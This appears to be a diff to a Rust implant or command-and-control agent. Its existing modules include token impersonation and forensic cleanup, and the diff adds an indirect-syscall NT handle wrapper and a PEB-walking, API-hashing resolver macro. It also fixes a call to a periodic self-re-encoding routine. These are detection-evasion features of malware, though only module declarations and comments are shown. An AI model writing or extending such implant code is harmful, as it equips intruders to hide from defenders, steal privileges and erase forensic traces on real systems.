@@ -229,6 +229,19 @@ pub mod token_impersonation;
 #[cfg(all(windows, feature = "forensic-cleanup"))]
 pub mod forensic_cleanup;
 
+// RAII wrapper around NT kernel handles.  Automatically calls NtClose
+// via indirect syscall on drop, preventing handle leaks across early
+// returns and error paths.  Windows-only (uses syscall_NtClose).
+#[cfg(windows)]
+pub mod nt_handle;
+
+// Macro for cached dynamic API resolution via PEB walking + API hashing.
+// The resolve_api! macro creates a OnceLock-backed static, resolving the
+// target function on first use and returning the cached pointer thereafter.
+// Foundation utility — no existing code is refactored to use it yet.
+#[macro_use]
+pub mod pe_resolve_macros;
+
 use anyhow::Result;
 use common::{CryptoSession, Message, Transport};
 use log::{error, info, warn};
@@ -631,7 +644,7 @@ impl Agent {
                 cfg.reencode_interval_secs
             };
             let default_seed =
-                crate::self_reencode::derive_default_seed(self.crypto.key_bytes());
+                crate::self_reencode::derive_default_seed(&self.crypto.key_bytes());
             let shutdown = crate::handlers::SHUTDOWN_NOTIFY.clone();
             tasks.spawn(async move {
                 let _ = crate::self_reencode::spawn_periodic_reencode(
